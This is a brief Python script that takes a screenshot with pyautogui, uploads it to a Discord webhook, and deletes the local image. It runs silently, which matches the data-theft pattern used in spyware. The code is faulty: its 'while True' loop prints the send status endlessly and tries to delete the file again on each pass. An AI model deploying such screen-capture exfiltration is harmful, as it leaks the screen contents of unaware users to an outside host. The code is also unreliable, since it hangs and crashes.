import pyautogui
import os
import requests

# Path where the screenshot will be saved temporarily
screenshot_path = "screenshot.png"

# Takes a screenshot
screenshot = pyautogui.screenshot()
screenshot.save(screenshot_path)  # Save screenshot to file

# (replace with your actual webhook URL)
webhook_url = ""

#sends the screenshot to the Discord webhook
with open(screenshot_path, "rb") as file:
    payload = {
        'content': 'Here is the screenshot!'
    }
    files = {
        'file': (screenshot_path, file, 'image/png')
    }
    response = requests.post(webhook_url, data=payload, files=files)

# Check the response
while True:
    if response.status_code == 204:
     print("Screenshot sent successfully!")
    else:
       print(f"Failed to send screenshot: {response.status_code}")

#(Optional), deletes the screenshot after sending it
    os.remove(screenshot_path)
